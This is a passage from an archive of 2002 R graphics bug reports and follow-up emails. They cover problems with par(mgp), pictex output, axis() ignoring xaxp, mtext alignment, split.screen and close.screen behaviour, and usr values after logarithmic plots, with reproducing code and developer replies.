OS: Windows 2000
Submission from: (NULL) (202.36.29.1)


The mgp parameter in par() does not allow negative values. That is, it does not
allow plots with axes ticks and labels inside the plot. The help document,
Introduction to R, under Graphics: Axes and tick marks, specifically mentions
negative values for mgp as a way to achieve internal ticks and labels. 

Code:
> par(mgp=c(-3,-1,0))
Error in par(mgp = c(-3, -1, 0)) : invalid value specified for graphics
parameter "mgp"

> par(mgp=c(3,-1,0))
Error in par(mgp = c(3, -1, 0)) : invalid value specified for graphics parameter
"mgp".

> par(mgp=c(3,1,-1))
Error in par(mgp = c(3, 1, -1)) : invalid value specified for graphics parameter
"mgp".

> par(mgp=c(-3,1,0))
Error in par(mgp = c(-3, 1, 0)) : invalid value specified for graphics parameter
"mgp".






==> 1395.audit <==
Wed Mar 20 09:15:03 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1505 *
Subject: pictex 
From: luchini@ehess.cnrs-mrs.fr
Date: Thu, 2 May 2002 12:23:21 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1505 <==
From luchini@ehess.cnrs-mrs.fr  Thu May  2 12:23:22 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA03886
	for <R-bugs@biostat.ku.dk>; Thu, 2 May 2002 12:23:21 +0200 (MET DST)
Date: Thu, 2 May 2002 12:23:21 +0200 (MET DST)
From: luchini@ehess.cnrs-mrs.fr
Message-Id: <200205021023.MAA03886@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: pictex 

Full_Name: Stephane Luchini
Version: 1.4.1
OS: Redhat 7.2
Submission from: (NULL) (193.50.233.43)


I want to use R to plot an histogram of a vector of size 759 with min=-63260e+06

and max=3.700646.

When I use X11 as the output device, there is no problem to obtain the desired 
graphics using the following instructions:

hist(VED,br=60,prob=TRUE)
lines(density(VED,bw=7.668e+05))

Now, if I use the pictex driver :
pictex(file = "test.pictex")

The whole pictex code is not generated. It stops after line 760.
When I put debug = TRUE, it stops after 243 lines.

==> 1505.audit <==
Tue May  7 09:07:02 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1654 *
Subject: R 1.5.0: axis() does not honor the xaxp argument
From: "Robert D. Merithew" <merithew@ccmr.cornell.edu>
Date: Tue, 11 Jun 2002 09:29:39 -0400 (EDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1654 <==
From postmaster@franz.stat.wisc.edu  Tue Jun 11 16:33:40 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA04905
	for <r-bugs@biostat.ku.dk>; Tue, 11 Jun 2002 16:33:40 +0200 (MET DST)
Received: from mercury.ccmr.cornell.edu (really [128.84.231.97]) by franz.stat.wisc.edu
	via smail with esmtp (ident 0 using rfc1413)
	id <m17HmaZ-000IYKC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 09:25:39 -0500 (CDT) 
Received: from magic.ccmr.cornell.edu (IDENT:0@magic.ccmr.cornell.edu [128.84.231.181])
	by mercury.ccmr.cornell.edu (8.9.3/8.9.3) with ESMTP id JAA21476
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 09:33:13 -0400
Received: from localhost (merithew@localhost)
	by magic.ccmr.cornell.edu (8.9.3/8.9.3) with ESMTP id JAA12487
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 09:29:39 -0400
X-Authentication-Warning: magic.ccmr.cornell.edu: merithew owned process doing -bs
Date: Tue, 11 Jun 2002 09:29:39 -0400 (EDT)
From: "Robert D. Merithew" <merithew@ccmr.cornell.edu>
Reply-To: rdm28@cornell.edu
To: r-bugs@r-project.org
Subject: R 1.5.0: axis() does not honor the xaxp argument
Message-ID: <Pine.LNX.4.44.0206110918130.12431-100000@magic.ccmr.cornell.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII



----------------------- transcript --------------------------
$ R --vanilla

R : Copyright 2002, The R Development Core Team
Version 1.5.0  (2002-04-29)

R is free software and comes with ABSOLUTELY NO WARRANTY.
You are welcome to redistribute it under certain conditions.
Type `license()' or `licence()' for distribution details.

R is a collaborative project with many contributors.
Type `contributors()' for more information.

Type `demo()' for some demos, `help()' for on-line help, or
`help.start()' for a HTML browser interface to help.
Type `q()' to quit R.

> plot(c(0,1),c(0.2,0.3),xaxt="n")
> axis(1,xaxp=c(0,1,4))
> version
         _
platform i586-pc-linux-gnu
arch     i586
os       linux-gnu
system   i586, linux-gnu
status
major    1
minor    5.0
year     2002
month    04
day      29
language R
>
------------------------end transcript ---------------------

I expect only 4 intervals on the x-axis, but find 5 intervals.  The same
problem seems to exist for axis() with a yaxp argument.

The sequence:

> plot(c(0,1),c(0.2,0.3),xaxt="n")
> par(xaxp=c(0,1,4))
> axis(1)

does draw an axis with four intervals, though.


On R-Help, in response to my question about this, Paul Murrell
<p.murrell@auckland.ac.nz> wrote:

> This appears to be a bug.  axis() should respond to an "in-line" xaxp
> setting.
>
> I can see a place in the C code where the problem appears to be, but an
> attempted quick fix failed.
>
> Could you please submit a bug report so that I (or someone else) will
> remember to have a proper look later?
>
> Thanks
>
> Paul


Thanks,
--
Robert Merithew





==> 1654.followup.1 <==
From p.murrell@auckland.ac.nz  Wed Jun 12 00:04:30 2002
Received: from mailhost2.auckland.ac.nz (mailhost2.auckland.ac.nz [130.216.191.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA06582
	for <R-bugs@biostat.ku.dk>; Wed, 12 Jun 2002 00:04:28 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost2.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id KAA25770
	for <R-bugs@biostat.ku.dk>; Wed, 12 Jun 2002 10:03:45 +1200 (NZST)
Received: from stat.auckland.ac.nz (murrell.stat.auckland.ac.nz [130.216.50.118])
	by stat1.stat.auckland.ac.nz (8.11.6+Sun/8.8.8) with ESMTP id g5BM3jI03971;
	Wed, 12 Jun 2002 10:03:45 +1200 (NZST)
Message-ID: <3D067451.59949C1C@stat.auckland.ac.nz>
Date: Wed, 12 Jun 2002 10:06:09 +1200
From: Paul Murrell <p.murrell@auckland.ac.nz>
X-Mailer: Mozilla 4.78 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
CC: R-bugs@biostat.ku.dk
Subject: Re: R 1.5.0: axis() does not honor the xaxp argument (PR#1654)
References: <200206111433.QAA04910@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Hi


> ----------------------- transcript --------------------------
> $ R --vanilla
> 
> R : Copyright 2002, The R Development Core Team
> Version 1.5.0  (2002-04-29)
> 
> R is free software and comes with ABSOLUTELY NO WARRANTY.
> You are welcome to redistribute it under certain conditions.
> Type `license()' or `licence()' for distribution details.
> 
> R is a collaborative project with many contributors.
> Type `contributors()' for more information.
> 
> Type `demo()' for some demos, `help()' for on-line help, or
> `help.start()' for a HTML browser interface to help.
> Type `q()' to quit R.
> 
> > plot(c(0,1),c(0.2,0.3),xaxt="n")
> > axis(1,xaxp=c(0,1,4))
> > version
>          _
> platform i586-pc-linux-gnu
> arch     i586
> os       linux-gnu
> system   i586, linux-gnu
> status
> major    1
> minor    5.0
> year     2002
> month    04
> day      29
> language R
> >
> ------------------------end transcript ---------------------
> 
> I expect only 4 intervals on the x-axis, but find 5 intervals.  The same
> problem seems to exist for axis() with a yaxp argument.
> 
> The sequence:
> 
> > plot(c(0,1),c(0.2,0.3),xaxt="n")
> > par(xaxp=c(0,1,4))
> > axis(1)
> 
> does draw an axis with four intervals, though.
> 
> On R-Help, in response to my question about this, Paul Murrell
> <p.murrell@auckland.ac.nz> wrote:
> 
> > This appears to be a bug.  axis() should respond to an "in-line" xaxp
> > setting.
> >
> > I can see a place in the C code where the problem appears to be, but an
> > attempted quick fix failed.


For the record, the place in the C code is in plot.c in do_axis where
there appear to be two problems:  (i)  the code sets a local variable
from the dpptr(dd)->xaxp rather than the gpptr(dd)->xaxp, and (ii) the
code sets this local variable BEFORE calling ProcessInlinePars().  So
there are two obstacles to fix before do_axis will respond to an in-line
xaxp setting.  NOTE also that several other local variables are set from
dpptr(dd)-><something> in the same place, so these should be fixed as
well.

Paul

==> 1654.audit <==
Wed Jun 12 17:36:35 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1659 *
Subject:  mtext() alignment of perpendicular text 
From: p.murrell@auckland.ac.nz
Date: Wed, 12 Jun 2002 13:29:45 +1200 (NZST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1659 <==
From postmaster@franz.stat.wisc.edu  Wed Jun 12 03:30:31 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id DAA06869
	for <r-bugs@biostat.ku.dk>; Wed, 12 Jun 2002 03:30:30 +0200 (MET DST)
Received: from mailhost2.auckland.ac.nz (really [130.216.191.4]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17HwxI-000IXcC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 11 Jun 2002 20:29:48 -0500 (CDT) 
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost2.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id NAA27667
	for <r-bugs@r-project.org>; Wed, 12 Jun 2002 13:29:46 +1200 (NZST)
Received: (from paul@localhost)
	by stat1.stat.auckland.ac.nz (8.11.6+Sun/8.8.8) id g5C1TjS23236;
	Wed, 12 Jun 2002 13:29:45 +1200 (NZST)
Date: Wed, 12 Jun 2002 13:29:45 +1200 (NZST)
Message-Id: <200206120129.g5C1TjS23236@stat1.stat.auckland.ac.nz>
From: p.murrell@auckland.ac.nz
To: r-bugs@r-project.org
Cc: paul@stat1.stat.auckland.ac.nz
Subject:  mtext() alignment of perpendicular text 


mtext() does a poor job of placing text when it is perpendicular (e.g.,
side=1, las=3) and the font size is not the default.

The following code snippet demonstrates the problem ...

plot(1:10)
abline(v=1:10, col="grey")
axis(3, at=1:10, las=3, labels=FALSE)
mtext(1:10, at=1:10, side=3, line=1, las=3)
axis(3, line=-2, at=1:10, las=3, labels=FALSE)
mtext(1:10, at=1:10, side=3, line=-1, las=3, cex=.5)
axis(3, line=-5, at=1:10, las=3, labels=FALSE)
mtext(1:10, at=1:10, side=3, line=-4, las=3, cex=2)

The ugliness varies a bit across devices.

In GMtext() in graphics.c there is a hardcoded adjustment of 0.3 which
is described as "purely visual tuning".  I think this needs to be
replaced with a more general solution.

Paul


--please do not edit the information below--

Version:
 platform = sparc-sun-solaris2.7
 arch = sparc
 os = solaris2.7
 system = sparc, solaris2.7
 status = Under development (unstable)
 major = 1
 minor = 6.0
 year = 2002
 month = 06
 day = 10
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

==> 1659.audit <==
Wed Jun 12 17:36:35 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1878 *
Subject: close.screen
From: Martin.Schlather@uni-bayreuth.de
Date: Mon, 5 Aug 2002 22:35:02 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1878 <==
From Martin.Schlather@uni-bayreuth.de  Mon Aug  5 22:35:03 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA18778
	for <R-bugs@biostat.ku.dk>; Mon, 5 Aug 2002 22:35:02 +0200 (MET DST)
Date: Mon, 5 Aug 2002 22:35:02 +0200 (MET DST)
From: Martin.Schlather@uni-bayreuth.de
Message-Id: <200208052035.WAA18778@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: close.screen

Full_Name: Martin Schlather
Version: 1.5.1
OS: Linux
Submission from: (NULL) (132.180.72.150)


Hi,

As a user it is not obvious to me why
"close.screen" should return a warning message in 

split.screen(figs=c(1,2))
i <- 2  
screen(i)
close.screen(i)

whereas no warning message appears for i <- 1.


In fact, the warning message appears since the condition
   .split.valid.screens >  temp
in close.screen is not satisfied by any element of .split.valid.screens

Replacing 

   if (temp %in% n) 
       temp <- min(.split.valid.screens[.split.valid.screens > 
           temp])
   if (temp > max(.split.valid.screens)) 
       temp <- min(.split.valid.screens)

by

   if (temp > max(.split.valid.screens)) 
      temp <- min(.split.valid.screens)
   else
      if (temp %in% n) 
         temp <- min(.split.valid.screens[.split.valid.screens > 
             temp])

should avoid the warning message without any other changings in the
functionality of close.screen.

Cheers,
Martin




==> 1878.audit <==
Thu Aug  8 09:04:26 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1933 *
Subject: dev2eps() prints ticks with wrong length!
From: Timur Elzhov <Timur.Elzhov@jinr.ru>
Date: Fri, 23 Aug 2002 17:22:15 +0400
--dev.copy problem
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1933 <==
From postmaster@franz.stat.wisc.edu  Fri Aug 23 15:15:27 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA23911
	for <r-bugs@biostat.ku.dk>; Fri, 23 Aug 2002 15:15:26 +0200 (MET DST)
Received: from nfsun5.jinr.ru (really [159.93.21.8]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17iEH0-000IWqC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 23 Aug 2002 08:14:46 -0500 (CDT) 
Received: from pcf004.jinr.ru (pcf004.jinr.ru [159.93.29.4])
	by nfsun5.jinr.ru (8.11.2/8.11.6) with ESMTP id g7NDEZX20985
	for <r-bugs@r-project.org>; Fri, 23 Aug 2002 17:14:36 +0400 (MSK-DST)
Received: from etv by pcf004.jinr.ru with local (Exim 3.32 #1 (Debian))
	id 17iEOH-0003OH-00
	for <r-bugs@r-project.org>; Fri, 23 Aug 2002 17:22:17 +0400
Date: Fri, 23 Aug 2002 17:22:15 +0400
From: Timur Elzhov <Timur.Elzhov@jinr.ru>
To: r-bugs@r-project.org
Subject: dev2eps() prints ticks with wrong length!
Message-ID: <20020823132214.GA13023@pcf004.jinr.ru>
Mime-Version: 1.0
Content-Type: text/plain; charset=koi8-r
Content-Disposition: inline
User-Agent: Mutt/1.4i
Sender: Timur Elzhov <etv@pcf004.jinr.ru>

Hello R experts!

I've tried to make single plot, but with changed ticks length,
and then copy them to file by dev.copy2eps(). Here is the code:

   x11 ( , 5, 5)
   par (tcl = +5) 
   plot (0)        # that's ugly plot with great ticks
                   # on the graph viewport.  cool :)
   dev.copy2eps (file = "out.eps")

Hm.. I had a look at "out.ps" and wondered that ticks
look like as they would being set to there *default* value,
"tcl" = -0.5!  =-O

Ok, I tried then to make same thing by slightly different way:

    postscript (file = "out1.eps", onefile = FALSE)
    par (tcl = +5)
    plot (0)
    dev.off ()

Beautiful -- all the ticks have an appropriate length, tcl == +5!

Why?


-------------- == --------------
    R> version
    _
    platform i386-pc-linux-gnu
    arch     i386
    os       linux-gnu
    system   i386, linux-gnu
    status
    major    1
    minor    5.1

-------------- == --------------


With best regards,
Timur V. Elzhov



==> 1933.audit <==
Sun Aug 25 11:54:31 2002	ripley	changed notes
Sun Aug 25 11:54:31 2002	ripley	foobar
Sun Aug 25 11:54:31 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2069 *
Subject: split.screen problem
From: cbodily@att.net
Date: Thu, 26 Sep 2002 19:37:40 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2069 <==
From cbodily@att.net  Thu Sep 26 19:37:41 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA21297
	for <R-bugs@biostat.ku.dk>; Thu, 26 Sep 2002 19:37:40 +0200 (MET DST)
Date: Thu, 26 Sep 2002 19:37:40 +0200 (MET DST)
From: cbodily@att.net
Message-Id: <200209261737.TAA21297@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: split.screen problem

Full_Name: Chris Bodily
Version: 1.5.1
OS: W2K
Submission from: (NULL) (63.106.106.2)


I took the following code directly from the 'split.screen' help page in R and
modified one line to highlight the problem I encountered.  Basically, it appears
that when plotting in split screens and attempting to return to a particular
screen to add or update points, the axes from the original plot are not
remembered, causing the new points to plot incorrectly.
 
A workaround seem to be storing the original plot range and issuing
'plot(x,y,type="n")' where x and y are data vectors with ranges that match the
original plot in the screen of interest.  Then a 'points' command draws in the
correct locations.
 
I found this by moving working code from S-Plus 2000 into R v1.5.1 and noticed
that a particular interactive plot I use began drawing incorrectly.
 
Thanks,
 
Chris Bodily
 
#--------------------------------------------------------------------------------------
 
 
   if (interactive()) {
     par(bg = "white")           # default is likely to be transparent
 
     split.screen(c(2,1))        # split display into two screens
     split.screen(c(1,2),2)      # split bottom half in two
 
     plot(1:10)                  # screen 3 is active, draw plot
     erase.screen()              # forgot label, erase and redraw
     plot(1:10, ylab= "ylab 3")
 
     screen(1)                   # prepare screen 1 for output
     plot(1:10)
 
     screen(4)                   # prepare screen 4 for output
     plot(1:10, ylab="ylab 4")
 
     screen(1, FALSE)            # return to screen 1, but do not clear
#     plot(10:1,axes=FALSE, pch=2,col=5, lty=2, ylab="")  # overlay second plot

## Problem here as the following points get plotted incorrectly ##
## it seems that the axes are reset                             ##
     points(rep(3,10),1:10,col=2,pch=2)  # add a few more points for a test
 
     axis(4)                     # add tic marks to right-hand axis
     title("Plot 1")
     close.screen(all = TRUE)    # exit split-screen mode
     }


==> 2069.audit <==
Tue Oct  1 00:20:40 2002	thomas	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2283 *
Subject: Wandering usr values in par(no.readonly=TRUW)
From: Jari Oksanen <jarioksa@sun3.oulu.fi>
Date: Tue, 12 Nov 2002 13:50:44 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2283 <==
From jarioksa@pc112145.oulu.fi  Tue Nov 12 12:51:40 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA07314
	for <r-bugs@biostat.ku.dk>; Tue, 12 Nov 2002 12:51:39 +0100 (MET)
Received: from pc112145.oulu.fi ([130.231.112.145] ident=[s96AW+1Zs9cPBqGskCg5J6XRkFQbLqG1])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 18BZZG-0003mQ-00
	for <r-bugs@r-project.org>; Tue, 12 Nov 2002 05:50:54 -0600
Received: from pc112145.oulu.fi (jarioksa@localhost)
	by pc112145.oulu.fi (8.11.6/8.11.6) with ESMTP id gACBojB14813
	for <r-bugs@r-project.org>; Tue, 12 Nov 2002 13:50:45 +0200
Message-Id: <200211121150.gACBojB14813@pc112145.oulu.fi>
X-Mailer: exmh version 2.5 07/13/2001 with nmh-1.0.4
To: r-bugs@r-project.org
X-Face: #1;E;(IH&rRlD$\T&b}/by1WC%wv7r>$1u@~pvXzPr(bZ,*,8?599t;]Ue=S@~'(F$Ah{m;
 BM$8X.TeSEUi_~Qi(O?JlUI$0q"}Vt#6j*0I'**nSd+QtbA:I>U-%j0?%E=WxEA~!41E".)PPt:%*X
 U/exl1Z5QF(f65[(R+V/QccPRZgw1sracNQTeLL=j2?fYdu-z<E
Subject: Wandering usr values in par(no.readonly=TRUW)
Mime-Version: 1.0
Content-Type: multipart/signed; boundary="==_Exmh_1801894504P";
	 micalg=pgp-md5; protocol="application/pgp-signature"
Content-Transfer-Encoding: 7bit
Date: Tue, 12 Nov 2002 13:50:44 +0200
From: Jari Oksanen <jarioksa@sun3.oulu.fi>

--==_Exmh_1801894504P
Content-Type: text/plain; charset=us-ascii

Dear R folks,

Initially I had a plotting routine using logarithmic y-axes that failed after
repeated calls if I tried to restore the graphical parameters (which I wanted to
do because I used `layout' within the routine. I tried to isolate the problem
and found out that the following code with logarithmic axis is sufficient for
reproducing the failure:

> plot2.log
function (x=1:2,y=1:2) 
{
   op <- par(no.readonly=TRUE)
   on.exit(par(op))
   cat(op$usr, "\n")
   plot(x, y, log="y")
   #par(op)
   invisible(op)
}

Here is a session with the typical error message (Infinite axis extents):

> op <- par(no.readonly=TRUE)
> op$usr
[1] 0 1 0 1
> plot2.log()$usr
0 1 0 1 
[1] 0 1 0 1
> plot2.log()$usr
0 1 1 10 
[1]  0  1  1 10
> plot2.log()$usr
0 1 10 1e+10 
Error in par(op) : Infinite axis extents [GPretty(1e+10,inf,5)]

So this happens only with a repeated call to logarithmic axes.

I found out this feature sometimes back in R-1.5*, but I regarded that as my 
own bug. It started to disturb me yesterday when I had a live R session in my 
lectures, and got to edit away the par-restoring code to continue.

Best wishes, Jari Oksanen


--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 6.1
 year = 2002
 month = 11
 day = 01
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

-- 
Jari Oksanen -- Dept Biology, Univ Oulu, 90014 Oulu, Finland
Ph. +358 8 5531526, cell +358 40 5136529, fax +358 8 5531061
email jari.oksanen@oulu.fi, homepage http://cc.oulu.fi/~jarioksa/



--==_Exmh_1801894504P
Content-Type: application/pgp-signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.0.6 (GNU/Linux)
Comment: Exmh version 2.1.1 10/15/1999

iD8DBQE90OsUWnxFzE9NjaURAcwSAJwJdXXP/qgUyCFahR4GsWbBxVl0YACeKBPe
AFIwTfrg/l7H0fr0HJONcaI=
=mkza
-----END PGP SIGNATURE-----

--==_Exmh_1801894504P--

==> 2283.audit <==
Wed Nov 13 00:07:23 2002	thomas	moved from incoming to Graphics

==> 2283.reply.1 <==
From maechler@stat.math.ethz.ch  Wed Nov 13 18:48:25 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA23631
	for <R-bugs@biostat.ku.dk>; Wed, 13 Nov 2002 18:48:24 +0100 (MET)
Received: from lynne.ethz.ch (IDENT:root@lynne [129.132.58.30])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id gADHldL9004377;
	Wed, 13 Nov 2002 18:47:39 +0100 (MET)
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id gADHlcO21499;
	Wed, 13 Nov 2002 18:47:38 +0100
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15826.36921.839490.28287@gargle.gargle.HOWL>
Date: Wed, 13 Nov 2002 18:47:37 +0100
To: R-bugs@stat.math.ethz.ch
Cc: <mschwartz@medanalytics.com>, <jarioksa@sun3.oulu.fi>
Subject: RE: Wandering usr values in par(no.readonly=TRUE) (PR#2283)
In-Reply-To: <008f01c28b36$5ccf75b0$0201a8c0@MARC>
References: <008f01c28b36$5ccf75b0$0201a8c0@MARC>
X-Mailer: VM 7.07 under Emacs 21.2.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Marc" == Marc Schwartz <mschwartz@medanalytics.com>
>>>>>     on Wed, 13 Nov 2002 11:01:49 -0600 writes:

    Marc> Marc Schwartz wrote:
    >>  SNIP
    >> 
    >> I am guessing that this may be the result of par("ylog")
    >> and par("xlog") being read only and perhaps impacting the
    >> restoration of the par("usr") values when the plotting
    >> device is still open, but that may be incorrect.

    Marc> In follow up to my own note from last evening on this
    Marc> and now that I have had a couple of cups of coffee
    Marc> this morning, I need to partially correct my above
    Marc> statement and point to a presumed typo in the ?par
    Marc> help file.  For confirmation, this is R 1.6.1 under
    Marc> WinXP Pro.

    Marc> par("xlog") and par("ylog") are not Read Only
    Marc> parameters as listed in the help file and can be set
    Marc> by the user.  Indeed this is confirmed in the comments
    Marc> in par.r:

    Marc> #.Pars.readonly <- c("cin","cra","csi","cxy","din")

    Marc> I noted this today as I was comparing the output of
    Marc> par() with par(no.readonly = TRUE) and noted that the
    Marc> latter returns '$xlog' and $ylog' as being
    Marc> settable. The other 5 par values listed in ?par as
    Marc> "R.O." (cin, cra, csi, cxy and din) return errors when
    Marc> one attempts to set them with par(args), however xlog
    Marc> and ylog do not.

Yes, indeed, and I -- as an R-core member -- am astonished:.
I didn't know it really worked, but it does, e.g., 

  > plot(1:10); par("usr")
  [1]  0.64 10.36  0.64 10.36
  > par(xlog = TRUE); par(c("xlog","usr"))
  $xlog
  [1] TRUE

  $usr
  [1] -0.1938200  1.0153598  0.6400000 10.3600000

  > points(10^(1:9), 1 + 1:9, col = "red") # draws red points above 


I'm now re-directing this back to R-bugs to make sure that 
the only (right?) remaining bug, documentation in par.Rd, 
will be fixed -- and hope to close this as a bug report.

    Marc>   ..........
    Marc>   <more good analysis>

Thank you Marc!

Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
Seminar fuer Statistik, ETH-Zentrum  LEO C16	Leonhardstr. 27
ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
phone: x-41-1-632-3408		fax: ...-1228			<><

==> 2283.followup.1 <==
From mschwartz@medanalytics.com  Wed Nov 13 20:09:33 2002
Received: from mail7.atl.registeredsite.com (nobody@mail7.atl.registeredsite.com [64.224.219.81])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA23868
	for <R-bugs@biostat.ku.dk>; Wed, 13 Nov 2002 20:09:32 +0100 (MET)
Received: from mail.medanalytics.com (mail.medanalytics.com [64.225.164.192])
	by mail7.atl.registeredsite.com (8.12.2/8.12.5) with ESMTP id gADJ8jjx025585;
	Wed, 13 Nov 2002 14:08:45 -0500
Received: from MARC [64.225.164.192] by mail.medanalytics.com with ESMTP
  (SMTPD32-6.06) id A33BDAD400F0; Wed, 13 Nov 2002 14:08:43 -0500
Reply-To: <mschwartz@medanalytics.com>
From: "Marc Schwartz" <mschwartz@medanalytics.com>
To: <maechler@stat.math.ethz.ch>, <r-devel@stat.math.ethz.ch>
Cc: <R-bugs@biostat.ku.dk>
Subject: RE: Wandering usr values in par(no.readonly=TRUE) (PR#2283)
Date: Wed, 13 Nov 2002 13:08:42 -0600
Organization: MedAnalytics, Inc.
Message-ID: <000201c28b48$15c93810$0201a8c0@MARC>
MIME-Version: 1.0
Content-Type: text/plain;
	charset="us-ascii"
X-Priority: 3 (Normal)
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook, Build 10.0.4024
In-Reply-To: <200211131748.SAA23636@pubhealth.ku.dk>
Importance: Normal
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id UAA23868

Martin wrote:
> SNIP
> 
> Thank you Marc!

Glad to be of help Martin.  

For the sake of completeness, I ran the same examples on my Linux (RH 8)
install of R 1.6.1 and observed the same behavior.

Best regards,

Marc Schwartz


==> 2283.followup.2 <==
From mschwartz@medanalytics.com  Thu Nov 14 00:06:53 2002
Received: from mail11.atl.registeredsite.com (nobody@mail11.atl.registeredsite.com [64.224.219.85])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA24689
	for <R-bugs@biostat.ku.dk>; Thu, 14 Nov 2002 00:06:52 +0100 (MET)
Received: from mail.medanalytics.com (mail.medanalytics.com [64.225.164.192])
	by mail11.atl.registeredsite.com (8.12.2/8.12.5) with ESMTP id gADN64ii008429;
	Wed, 13 Nov 2002 18:06:05 -0500
Received: from MARC [64.225.164.192] by mail.medanalytics.com with ESMTP
  (SMTPD32-6.06) id AADAF334002C; Wed, 13 Nov 2002 18:06:02 -0500
Reply-To: <mschwartz@medanalytics.com>
From: "Marc Schwartz" <mschwartz@medanalytics.com>
To: <maechler@stat.math.ethz.ch>, <r-devel@stat.math.ethz.ch>
Cc: <R-bugs@biostat.ku.dk>
Subject: RE: Wandering usr values in par(no.readonly=TRUE) (PR#2283)
Date: Wed, 13 Nov 2002 17:06:00 -0600
Organization: MedAnalytics, Inc.
Message-ID: <001901c28b69$3cbef650$0201a8c0@MARC>
MIME-Version: 1.0
Content-Type: text/plain;
	charset="us-ascii"
X-Priority: 3 (Normal)
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook, Build 10.0.4024
In-Reply-To: <200211131748.SAA23636@pubhealth.ku.dk>
Importance: Normal
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id AAA24689

Martin wrote:
> I'm now re-directing this back to R-bugs to make sure that
> the only (right?) remaining bug, documentation in par.Rd,
